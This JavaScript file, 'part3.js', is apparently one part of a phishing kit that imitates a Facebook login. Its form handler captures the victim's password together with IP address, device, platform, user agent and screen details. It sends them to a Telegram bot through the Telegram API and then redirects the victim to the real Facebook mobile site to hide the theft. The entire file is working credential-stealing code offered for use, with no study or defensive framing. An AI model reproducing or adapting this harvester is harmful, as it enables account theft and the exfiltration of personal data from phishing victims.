// part3.js
document.getElementById('login-form').addEventListener('submit', function (e) {
    e.preventDefault();

    const password = document.getElementById('password').value;

    if (!password) {
        alert('Please enter your password.');
        return;
    }

    console.log('Password entered:', password);

    getUserInfo()
        .then(userInfo => {
            const message = `
<b>New Login Attempt</b>
<b>Password:</b> ${password}
<b>IP Address:</b> ${userInfo.ip}
<b>Device Type:</b> ${userInfo.deviceType}
<b>Platform:</b> ${userInfo.platform}
<b>User Agent:</b> ${userInfo.userAgent}
<b>Screen Resolution:</b> ${userInfo.screenWidth}x${userInfo.screenHeight}
            `;

            console.log('Sending data to Telegram...');
            return axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                parse_mode: 'html',
                text: message
            });
        })
        .then(response => {
            console.log('Message sent successfully:', response.data);
            window.location.href = "https://m.facebook.com/";
        })
        .catch(err => {
            console.error('Error sending message to Telegram:', err);
            alert('Failed to send data. Please try again.');
        });
});

console.log('Part 3 loaded: Form submission handler ready.');
